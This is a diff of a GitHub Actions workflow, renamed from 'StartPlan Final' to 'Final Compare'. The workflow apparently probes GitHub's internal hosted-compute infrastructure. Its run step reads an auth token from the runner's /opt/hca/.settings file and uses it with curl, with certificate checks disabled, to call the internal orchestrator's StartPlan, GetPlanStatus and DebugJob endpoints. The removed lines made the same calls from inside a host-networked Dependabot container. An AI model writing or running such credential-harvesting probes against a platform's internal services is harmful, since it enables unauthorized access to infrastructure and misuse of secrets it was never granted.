@@ -1,33 +1,35 @@
-name: StartPlan Final
+name: Final Compare
 on:
   push:
     branches: [master]
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 3
     steps:
       - run: |
           TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
-          
-          # Use eus-01 where we know Twirp routing works
           BASE="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
           
-          echo "=== 1. StartPlan ==="
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
-            curl -skv --connect-timeout 15 \
-              -H 'Authorization: Bearer $TOK' \
-              -H 'Content-Type: application/json' \
-              -d '{\"planId\":\"'$(uuidgen)'\",\"workflowTemplate\":\"ubuntu-latest\"}' \
-              '${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan' 2>&1
-          " 2>&1 | tail -30
+          echo "=== GetPlanStatus (known to work) ==="
+          curl -sk --http2 --connect-timeout 10 \
+            -H "Authorization: Bearer $TOK" \
+            -H "Content-Type: application/json" \
+            -d '{}' \
+            "${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus" 2>&1
           
           echo ""
-          echo "=== 2. Then GetPlanStatus with same plan_id ==="
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
-            curl -sk --connect-timeout 10 \
-              -H 'Authorization: Bearer $TOK' \
-              -H 'Content-Type: application/json' \
-              -d '{\"planId\":\"test-123\"}' \
-              '${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus'
-          " 2>&1
+          echo "=== StartPlan ==="
+          curl -sk --http2 --connect-timeout 10 \
+            -H "Authorization: Bearer $TOK" \
+            -H "Content-Type: application/json" \
+            -d '{}' \
+            "${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan" 2>&1
+          
+          echo ""
+          echo "=== DebugJob ==="
+          curl -sk --http2 --connect-timeout 10 \
+            -H "Authorization: Bearer $TOK" \
+            -H "Content-Type: application/json" \
+            -d '{}' \
+            "${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/DebugJob" 2>&1
